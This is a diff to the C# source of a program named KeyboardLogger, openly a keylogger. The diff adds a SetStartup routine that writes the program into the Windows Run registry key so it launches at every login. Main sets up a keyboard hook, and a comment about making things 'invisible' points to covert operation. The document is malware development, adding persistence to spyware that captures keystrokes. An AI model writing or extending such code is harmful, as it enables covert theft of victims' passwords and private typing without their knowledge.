@@ -4,6 +4,7 @@ using System.Linq;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using Microsoft.Win32;
 using KeyboardLogger.KeyLog;
 
 namespace KeyboardLogger
@@ -13,6 +14,7 @@ namespace KeyboardLogger
         [STAThread]
         static void Main()
         {
+            SetStartup();
             KbdHook.Init();
             Application.Run();
             // time to make things invisible
@@ -22,5 +24,12 @@ namespace KeyboardLogger
         }
 
 
+        // SetStartup ()
+        // - register this program to run at startup
+        static void SetStartup()
+        {
+            RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            key.SetValue("KeyboardLogger", Application.ExecutablePath.ToString());
+        }
     }
 }
